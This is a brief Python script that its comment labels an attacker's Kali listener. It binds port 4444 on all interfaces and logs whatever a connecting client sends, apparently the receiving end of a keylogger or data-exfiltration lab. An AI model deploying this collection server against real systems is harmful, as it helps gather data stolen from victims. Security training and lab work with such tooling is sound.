import socket

# Bind server on attacker Kali
HOST = '0.0.0.0'  # Listen on all interfaces
PORT = 4444

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(5)
print(f"[+] Listening on {HOST}:{PORT}...")

client, addr = server.accept()
print(f"[+] Connection from {addr}")

while True:
    try:
        data = client.recv(1024).decode()
        if not data:
            break
        print(f"[LOG] {data}")
    except:
        break

client.close()
server.close()